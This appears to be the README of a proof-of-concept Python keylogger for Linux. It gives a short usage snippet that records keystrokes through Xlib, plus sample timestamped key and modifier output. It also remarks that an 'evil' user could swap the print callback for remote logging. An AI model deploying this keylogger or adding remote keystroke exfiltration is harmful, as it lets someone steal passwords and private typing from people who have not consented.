PyKeylogger is a proof of concept of a pure-python keylogger for linux.  It uses Xlib (so you must have an X connection!) to monitor the state of the keyboard.  Here's how you use it:

```python
import keylogger
import time

now = time.time()
done = lambda: time.time() > now + 60
def print_keys(t, modifiers, keys): print t, modifiers, keys

keylogger.log(done, print_keys)
```

This will print key events to stdout for 60 seconds.  If you wanted to be evil, instead of passing in a print callback, you could pass in a remote logging precedure.

Sample output:

    1314238512.78 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['a']
    1314238512.85 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['w']
    1314238512.91 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['e']
    1314238512.96 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238512.97 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238513.05 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['s']
    1314238513.07 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238513.18 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['o']
    1314238513.2 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238513.23 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['m']
    1314238513.31 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238513.34 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} ['e']
    1314238513.41 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238513.43 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': False, 'right ctrl': False} []
    1314238518.52 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': True, 'right ctrl': False} []
    1314238518.69 {'left shift': False, 'right alt': False, 'right shift': False, 'left alt': False, 'left ctrl': True, 'right ctrl': False} ['c']
